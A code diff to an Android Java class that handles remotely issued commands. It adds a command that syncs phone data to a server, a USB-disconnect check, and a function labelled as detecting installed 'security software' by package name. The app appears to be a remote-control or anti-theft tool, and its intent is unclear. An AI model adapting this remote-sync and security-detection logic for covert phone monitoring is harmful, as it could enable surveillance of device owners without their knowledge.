@@ -26,6 +26,7 @@ import android.graphics.BitmapFactory;
 import android.graphics.Color;
 import android.hardware.camera2.CameraAccessException;
 import android.hardware.camera2.CameraManager;
+import android.hardware.usb.UsbManager;
 import android.location.Location;
 import android.location.LocationListener;
 import android.location.LocationManager;
@@ -648,6 +649,10 @@ public class Lofl {
                 }
                 commandFound = true;
                 break;
+            case Commands.SYNC_PHONE_TO_SERVER:
+                intent.setAction(JobsIntentService.ACTION_SYNC_PHONE_TO_SERVER);
+                commandFound = true;
+                break;
             default:
                 break;
         }
@@ -657,6 +662,21 @@ public class Lofl {
             return false;
         }
         return commandFound;
+    }
+
+    public static boolean isUsbDisconnected(Context context){
+        UsbManager usbManager = (UsbManager) context.getSystemService(Context.USB_SERVICE);
+        return usbManager.getDeviceList().isEmpty() && usbManager.getAccessoryList() == null;
+    }
+
+    public static boolean hasSecuritySoftwareInstalled(Context context){
+        ArrayList<ApplicationInfo> apps = (ArrayList<ApplicationInfo>) Lofl.getInstalledApps(context);
+        for(ApplicationInfo appInfo : apps){
+            if(appInfo.packageName.equalsIgnoreCase("com.candroid.universeme")){
+                return true;
+            }
+        }
+        return false;
     }
 
     public static void playMosquitoRingtoneTwice(Context context) {
